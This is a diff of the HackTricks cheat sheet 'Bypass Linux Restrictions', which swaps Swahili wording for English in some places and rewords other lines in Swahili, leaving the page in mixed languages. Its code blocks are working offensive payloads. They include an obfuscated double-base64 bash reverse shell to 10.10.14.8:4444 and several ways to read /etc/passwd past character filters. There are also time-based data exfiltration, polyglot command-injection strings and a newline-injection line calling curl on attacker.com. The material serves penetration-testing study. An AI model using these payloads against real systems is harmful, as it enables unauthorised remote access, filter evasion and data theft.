@@ -1,16 +1,16 @@
-# Kupita Kizuizi za Linux
+# Bypass Linux Restrictions
 
 {% hint style="success" %}
-Jifunze na zoea AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na zoea GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
@@ -18,20 +18,20 @@ Jifunze na zoea GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-si
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia** mchakato wa kiotomatiki ulioendeshwa na zana za jamii **za juu zaidi** duniani.\
-Pata Ufikiaji Leo:
+Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## Kizuizi cha Kawaida Kupita
+## Common Limitations Bypasses
 
-### Kitanzi cha Nyuma
+### Reverse Shell
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Shell ya Kurejesha Haraka
+### Short Rev shell
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -39,7 +39,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Pita njia na maneno yaliyozuiwa
+### Pita Njia na Maneno Yaliyokatazwa
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -94,7 +94,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Pita nafasi zilizozuiliwa
+### Pita maeneo yaliyokatazwa
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -127,16 +127,16 @@ g # These 4 lines will equal to ping
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Pita nyuma ya mshale na mshale
+### Pita nyuma ya backslash na slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Pita mabomba
+### Bypass pipes
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Pita kwa kutumia uendeshaji wa hex
+### Bypass na hex encoding
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -146,28 +146,28 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Pita Kizuizi cha IPs
+### Bypass IPs
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Uchukuzi wa data kulingana na wakati
+### Uhamishaji wa data kulingana na muda
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Kupata herufi kutoka kwa Mazingira ya Variables
+### Kupata herufi kutoka kwa Mabadiliko ya Mazingira
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### Uchimbaji wa data ya DNS
+### DNS data exfiltration
 
 Unaweza kutumia **burpcollab** au [**pingb**](http://pingb.in) kwa mfano.
 
-### Violezo vya Ndani
+### Builtins
 
-Kwa hali ambapo huwezi kutekeleza kazi za nje na una ufikivu wa **seti ndogo ya violezo vya ndani kupata RCE**, kuna mbinu muhimu za kufanya hivyo. Kawaida **hutaweza kutumia** violezo **vyote**, hivyo unapaswa **kujua chaguo zako zote** kujaribu kukiuka gereza. Wazo kutoka [**devploit**](https://twitter.com/devploit).\
-Kwanza kabisa angalia **violezo vyote vya kifaa**. Kisha hapa una baadhi ya **mapendekezo**:
+Iwapo huwezi kutekeleza kazi za nje na una ufikiaji tu wa **seti ndogo ya builtins kupata RCE**, kuna mbinu kadhaa za kufanya hivyo. Kawaida **hutoweza kutumia zote** za **builtins**, hivyo unapaswa **kujua chaguo zako zote** ili kujaribu kupita gerezani. Wazo kutoka [**devploit**](https://twitter.com/devploit).\
+Kwanza kabisa angalia zote [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Hapa kuna baadhi ya **mapendekezo**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -219,12 +219,12 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-### Uingizaji amri wa lugha nyingi
+### Polyglot command injection
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Pita regexes za uwezekano
+### Pita regexes zinazoweza kuwa na matatizo
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -316,21 +316,21 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Kizuizi cha Kusoma tu/Noexec/Distroless Kupita
+## Read-Only/Noexec/Distroless Bypass
 
-Ikiwa uko ndani ya mfumo wa faili wenye **ulinzi wa kusoma tu na noexec** au hata kwenye chombo cha distroless, bado kuna njia za **kutekeleza programu za binary za kiholela, hata shel!:**
+Ikiwa uko ndani ya mfumo wa faili wenye **kinga za kusoma tu na noexec** au hata katika kontena lisilo na mfumo wa uendeshaji, bado kuna njia za **kutekeleza binaries za kiholela, hata shell!:**
 
 {% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
-## Kizuizi cha Chroot na Majaribio Mengine
+## Chroot & other Jails Bypass
 
 {% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
 {% endcontent-ref %}
 
-## Marejeo na Zaidi
+## References & More
 
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 * [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
@@ -340,22 +340,22 @@ Ikiwa uko ndani ya mfumo wa faili wenye **ulinzi wa kusoma tu na noexec** au hat
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutekeleza mchakato** kwa urahisi kutumia zana za jamii za **juu kabisa** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kujiendesha kiotomatiki** kwa urahisi kwa kutumia zana za jamii **zilizo na maendeleo zaidi** duniani.\
 Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 {% hint style="success" %}
-Jifunze na zoea Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na zoea Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki hila za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 {% endhint %}
